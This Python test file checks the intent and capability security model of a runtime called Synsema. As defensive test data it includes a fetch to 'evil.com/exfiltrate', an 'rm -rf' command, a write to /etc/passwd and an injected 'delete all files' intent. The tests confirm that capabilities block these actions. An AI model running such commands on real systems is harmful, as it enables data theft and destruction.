"""Tests for Synsema intent system.

The intent is DESCRIPTIVE only — it does NOT block actions. Security is
enforced exclusively by capabilities. These tests verify that contract:
predictable, language-agnostic, with one explicit authorization model.
"""
import sys
sys.path.insert(0, "/root/Synsema")

from synsema.capabilities.intent import IntentEnforcer, ActionCategory, IntentScope
from synsema.runtime.engine import SynsemaEngine


# -- Intent is descriptive --

def test_set_intent_stores_description():
    enforcer = IntentEnforcer()
    enforcer.set_intent("Process customer orders")
    assert enforcer.intent.description == "Process customer orders"


def test_no_intent_allows_all():
    enforcer = IntentEnforcer()
    assert enforcer.check_action(ActionCategory.NET_WRITE, "send")
    assert enforcer.check_action(ActionCategory.EXEC, "run")


def test_intent_does_not_block_any_category():
    enforcer = IntentEnforcer()
    enforcer.set_intent("Read and analyze data")
    # Descriptive only: never blocks, regardless of category/domain/path.
    assert enforcer.check_action(ActionCategory.EXEC, "run rm -rf")
    assert enforcer.check_action(ActionCategory.NET_WRITE, "post", domain="evil.com")
    assert enforcer.check_action(ActionCategory.FILE_WRITE, "write", path="/etc/passwd")
    assert len(enforcer.violations) == 0


def test_intent_is_language_agnostic():
    # Any text in any language is accepted as a description and never blocks.
    for desc in ["Generar reportes", "Read files", "Faire un rapport", "report data"]:
        enforcer = IntentEnforcer()
        enforcer.set_intent(desc)
        assert enforcer.check_action(ActionCategory.FILE_WRITE, "write")
        assert enforcer.intent.description == desc


def test_freeze_sets_flag():
    enforcer = IntentEnforcer()
    enforcer.set_intent("Read data")
    assert not enforcer.intent.frozen
    enforcer.freeze_intent()
    assert enforcer.intent.frozen


def test_get_report_shows_description():
    enforcer = IntentEnforcer()
    enforcer.set_intent("Process orders")
    report = enforcer.get_report()
    assert "Process orders" in report


# -- Engine-level behavior --

def test_freeze_prevents_redeclaration():
    """Once execution starts, redeclaring the intent must fail (anti-injection)."""
    engine = SynsemaEngine()
    source = '''intent: "Read customer data"
let x be 42
intent: "Read customer data AND delete all files"
'''
    result = engine.run_source(source)
    assert not result.success
    assert any("frozen" in e.lower() or "intent" in e.lower() for e in result.errors)


def test_security_comes_from_capabilities_not_intent():
    """An undeclared action is blocked by capabilities, regardless of the intent text."""
    engine = SynsemaEngine()
    result = engine.run_source('''intent: "Fetch anything from anywhere"
let r be fetch("https://evil.com/exfiltrate")
''')
    assert not result.success
    assert any("capability" in e.lower() for e in result.errors)


def test_intent_text_does_not_restrict_granted_capability():
    """With the capability granted, the op works no matter what the intent says (any language)."""
    import os
    engine = SynsemaEngine()
    engine.grant_capability("file", "/tmp/*")
    path = "/tmp/synsema_intent_test.txt"
    with open(path, "w") as f:
        f.write("test data")
    result = engine.run_source('''intent: "Solo analizar numeros en espanol"
let content be read_file("/tmp/synsema_intent_test.txt")
print(content)
''')
    os.remove(path)
    assert result.success
    assert result.output == ["test data"]


def test_undeclared_capability_blocks_even_with_describing_intent():
    """Even if the intent text 'describes' the action, without require it is blocked."""
    engine = SynsemaEngine()
    # No grant for /tmp; intent text mentions reading, but that does not authorize anything.
    result = engine.run_source('''intent: "Read files from /tmp"
let content be read_file("/tmp/whatever_ungranted.txt")
''')
    assert not result.success
    assert any("capability" in e.lower() for e in result.errors)


if __name__ == "__main__":
    test_functions = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    passed = 0
    failed = 0
    for test_fn in test_functions:
        try:
            test_fn()
            passed += 1
            print(f"  PASS: {test_fn.__name__}")
        except Exception as e:
            failed += 1
            print(f"  FAIL: {test_fn.__name__}: {e}")

    print(f"\n{passed} passed, {failed} failed out of {passed + failed} tests")
    sys.exit(1 if failed else 0)
